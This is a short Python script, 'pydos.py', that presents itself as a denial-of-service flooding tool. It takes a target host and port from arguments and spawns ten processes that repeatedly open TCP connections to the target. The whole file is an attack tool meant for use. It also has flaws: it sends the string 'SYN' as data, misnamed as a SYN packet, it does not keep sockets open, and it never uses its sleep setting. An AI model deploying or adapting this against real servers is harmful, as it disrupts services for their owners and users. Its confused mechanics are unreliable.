#!/usr/bin/env python3
"""
DoS by flooding

File name: pydos.py
Author: Konstantinos Christos Liosis
Date created: 21/6/2018
Python Version: 3.6.0

Example execution:
$ python pydos.py -server 192.168.1.254 -port 80 -sleep 1000 -conns 10000
"""

# modules import
import socket
import argparse
from time import sleep
import configparser
import threading
import multiprocessing

# parameters loading
params = configparser.ConfigParser()
params.read('params.ini')


class FloodConn(threading.Thread):
    threadCount = 0

    def __init__(self, server, port, verbose=False):
        threading.Thread.__init__(self)
        self.server = server
        self.port = port
        self.verbose = verbose

    def establish(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.server, self.port))
            data = "SYN"
            s.send(data.encode('utf-8'))
            FloodConn.threadCount += 1
            if self.verbose:
                print('Connection no. ', str(FloodConn.threadCount), ' opened')

        except Exception as e:
            print(e)
            s = None

        # return s

def parallel_est(server, port, conns):
    while FloodConn.threadCount < conns:
        FloodConn(server, port).establish()

def main():
    parser = argparse.ArgumentParser()

    # server
    parser.add_argument('-server', help='Server')
    # port
    parser.add_argument('-port', help='Port')
    # sleep time before terminating connections
    parser.add_argument('-sleep', help='Sleep time in seconds')
    # number of connections
    parser.add_argument('-conns', help='Number of connections')

    args = parser.parse_args()

    sleep_time = int(params['DoS']['sleep']) if not args.sleep else int(args.sleep)
    conns = int(params['DoS']['conns']) if not args.conns else int(args.conns)

    if not (args.server and args.port):
        print('You must define server address and port')
        server = input('Server: ')
        port = int(input('Port: '))

    else:
        server = args.server
        port = int(args.port)

    pool = []
    for _ in range(10):
        process = multiprocessing.Process(target=parallel_est, args=(server,
                                                                     port,
                                                                     conns,))
        pool.append(process)
        process.start()

if __name__ == "__main__":
    main()

